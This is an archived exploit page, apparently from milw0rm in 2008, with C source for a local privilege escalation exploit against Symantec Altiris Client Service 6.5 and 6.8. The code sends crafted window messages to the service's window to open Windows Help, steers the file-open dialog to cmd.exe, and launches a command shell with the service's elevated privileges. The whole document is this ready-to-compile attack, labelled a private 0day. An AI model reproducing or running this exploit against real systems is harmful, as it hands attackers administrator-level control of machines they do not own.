<html><head><title>Symantec Altiris Client Service 6.8.378 Local Privilege Escalation Exploit</title></head><pre>// 0day PRIVATE NOT DISTRIBUTE!!!
//
// Symantec Altiris Client Service Local Exploit (0day) 
//
// Affected Versions	: Altiris Client 6.5.248
//			  Altiris Client 6.5.299
//			  Altiris client 6.8.378
//
// Alex Hernandez aka alt3kx 
// ahernandez [at] sybsecurity.com
//
// Eduardo Vela aka sirdarckcat 
// sirdarckcat [at] gmail.com
//
// We'll see you soon at ph-neutral 0x7d8

#include &quot;stdio.h&quot;
#include &quot;windows.h&quot;

int main(int argc, char* argv[])
{
 HWND lHandle, lHandle2;
 POINT point;
 int id,a=0;
 char langH[255][255];
 char langO[255][255];
 char wname[]=&quot;Altiris Client Service&quot;;
 
 strcpy(langH[0x0c],&quot;Aide de Windows&quot;);
 strcpy(langH[0x09],&quot;Windows Help&quot;);
 strcpy(langH[0x0a],&quot;Ayuda de Windows&quot;);
 
 strcpy(langO[0x0c],&quot;Ouvrir&quot;);
 strcpy(langO[0x09],&quot;Open&quot;);
 strcpy(langO[0x0a],&quot;Abrir&quot;);
 
 printf(&quot;##########################################################\n&quot;);
 printf(&quot;#                  Altiris Client Service                #\n&quot;);
 printf(&quot;# WM_COMMANDHELP Windows Privilege Escalation Exploit    #\n&quot;);
 printf(&quot;# by sirdarckcat &amp; alt3kx                                #\n&quot;);
 printf(&quot;#                                                        #\n&quot;);
 printf(&quot;# This exploit is based on www.milw0rm.com/exploits/350  #\n&quot;);
 printf(&quot;# Utility Manager Privilege Elevation Exploit (MS04-019) #\n&quot;);
 printf(&quot;# by Cesar Cerrudo                                       #\n&quot;);
 printf(&quot;##########################################################\n\n&quot;);
  
 id=PRIMARYLANGID(GetSystemDefaultLangID());
 if (id==0 &amp;&amp; (id=PRIMARYLANGID(GetUserDefaultLangID()))){
    printf(&quot;Lang not found, using english\n&quot;);
    id=9;
 }

 char sText[]=&quot;%windir%\\system32\\cmd.ex?&quot;;

 if (argc&lt;2){
    printf(&quot;Use:\n&gt; %s [LANG-ID]\n\n&quot;,argv[0]);
    printf(&quot;Look for your LANG-ID here:\n&quot;);
    printf(&quot;http://msdn2.microsoft.com/en-us/library/ms776294.aspx\n&quot;);
    printf(&quot;\nAnyway, the program will try to guess it.\n\n&quot;);
    return 0;
 }else{
    if (argc==2){
       if (langH[atoi(argv[1])]){
          id=atoi(argv[1]);
          printf(&quot;Lang changed\n&quot;);
       }else{
          printf(&quot;Lang not supported\n&quot;,id);
       }
    }
 }
 printf(&quot;Using Lang %d\n&quot;,id);
 printf(&quot;Looking for %s..\n&quot;,wname);
 lHandle=FindWindow(NULL, wname);   
 if (!lHandle) {
  printf(&quot;Window %s not found\n&quot;, wname);
  return 0;
 }else{
  printf(&quot;Found! exploiting..\n&quot;);
 }
 PostMessage(lHandle,0x313,NULL,NULL);
 
 Sleep(100);

 SendMessage(lHandle,0x365,NULL,0x1);
 Sleep(300);
 pp:
 if (!FindWindow(NULL, langH[id])){
    printf(&quot;Help Window not found.. exploit unsuccesful\n&quot;);
    if (id!=9){
       printf(&quot;Trying with english..\n&quot;);
       id=9;
       goto pp;
    }else{
          return 0;
    } 
 }else{
    printf(&quot;Help Window found! exploiting..\n&quot;);
 } 
 SendMessage (FindWindow(NULL, langH[id]), WM_IME_KEYDOWN, VK_RETURN, 0);
 Sleep(500);
 lHandle = FindWindow(&quot;#32770&quot;,langO[id]);
 lHandle2 = GetDlgItem(lHandle, 0x47C);
 Sleep(500);
 printf(&quot;Sending path..\n&quot;);
 SendMessage (lHandle2, WM_SETTEXT, 0, (LPARAM)sText);
 Sleep(800);
 SendMessage (lHandle2, WM_IME_KEYDOWN, VK_RETURN, 0);
 lHandle2 = GetDlgItem(lHandle, 0x4A0);
 printf(&quot;Looking for cmd..\n&quot;); 
 SendMessage (lHandle2, WM_IME_KEYDOWN, VK_TAB, 0);
 Sleep(500);
 lHandle2 = FindWindowEx(lHandle,NULL,&quot;SHELLDLL_DefView&quot;, NULL);
 lHandle2 = GetDlgItem(lHandle2, 0x1);
 printf(&quot;Sending keys..\n&quot;);
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x43, 0);
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x4D, 0);
 SendMessage (lHandle2, WM_IME_KEYDOWN, 0x44, 0);
 Sleep(500);
 mark:
 PostMessage (lHandle2, WM_CONTEXTMENU, 0, 0);
 Sleep(1000);
 point.x =10; point.y =30;
 lHandle2=WindowFromPoint(point);
  Sleep(1000);
 printf(&quot;Opening shell..\n&quot;);
 SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0);
  Sleep(1000);
 SendMessage (lHandle2, WM_KEYDOWN, VK_DOWN, 0);
  Sleep(1000);
 SendMessage (lHandle2, WM_KEYDOWN, VK_RETURN, 0);
  Sleep(1000);
 if (!FindWindow(NULL,&quot;C:\\WINDOWS\\system32\\cmd.exe&quot;) &amp;&amp; !FindWindow(NULL,&quot;C:\\WINNT\\system32\\cmd.exe&quot;)){
    printf(&quot;Failed\n&quot;);
    if (!a){
        a++;
        goto mark;
    }
 }else{
       printf(&quot;Done!\n&quot;);
 }
 if(!a){
    SendMessage (lHandle, WM_CLOSE,0,0);
    Sleep(500);
    SendMessage (FindWindow(NULL, langH[id]), WM_CLOSE, 0, 0);
    SendMessage (FindWindow(NULL, argv[1]), WM_CLOSE, 0, 0);
 }else{
    printf(&quot;The exploit failed, but maybe the context window of the shell is visibile.\n&quot;);
 }
 return 0;
}

// milw0rm.com [2008-05-15]</pre></html>